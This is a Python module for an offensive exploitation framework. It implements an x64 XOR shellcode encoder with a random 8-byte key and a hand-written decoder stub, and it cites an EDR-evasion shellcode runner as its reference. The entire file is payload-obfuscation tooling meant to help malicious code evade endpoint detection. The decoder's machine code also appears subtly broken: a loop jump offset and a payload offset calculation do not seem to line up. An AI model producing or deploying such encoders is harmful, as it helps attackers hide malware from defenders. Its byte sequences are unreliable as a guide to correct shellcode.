#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""Cyclic XOR encoder with randomized 8-byte key and x64 decoder stub."""

import os

from kittysploit import *


class Module(Encoder):

    __info__ = {
        "name": "x64 Cyclic XOR Encoder",
        "description": (
            "XOR-encrypts shellcode with a random 8-byte key and attaches an x64 decoder stub "
            "(call/pop + rotating key), similar to classic XOR shellcode runners."
        ),
        "author": "KittySploit Team",
        "arch": Arch.X64,
        "platform": [Platform.WINDOWS, Platform.LINUX, Platform.MACOS],
        "references": [
            "https://github.com/JoasASantos/Awesome-EDR-Evasion/blob/main/Codes/01_xor_shellcode_runner.c",
        ],
    }

    def encode(self, payload):
        xor_key = os.urandom(8)
        encoded = bytes(b ^ xor_key[i % 8] for i, b in enumerate(payload))
        decoder = self._generate_decoder(len(encoded), xor_key)
        return decoder + encoded

    def _generate_decoder(self, payload_len: int, xor_key: bytes) -> bytes:
        decoder = bytearray()
        decoder += b"\xe8\x00\x00\x00\x00"
        decoder += b"\x5e"
        offset_placeholder = len(decoder)
        decoder += b"\x48\x81\xc6\x00\x00\x00\x00"
        decoder += b"\x48\x89\xf7"
        decoder += b"\x48\xb9" + payload_len.to_bytes(8, "little")
        key_padded = xor_key.ljust(8, b"\x00")
        decoder += b"\x48\xba" + key_padded
        loop_start = len(decoder)
        decoder += b"\x30\x16"
        decoder += b"\x48\xc1\xca\x08"
        decoder += b"\x48\xff\xc6"
        decoder += b"\x48\xff\xc9"
        decoder += b"\x75\xf3"
        decoder += b"\xff\xe7"
        decoder_len = len(decoder)
        offset = decoder_len - (offset_placeholder + 7)
        decoder[offset_placeholder + 3 : offset_placeholder + 7] = offset.to_bytes(4, "little")
        return bytes(decoder)
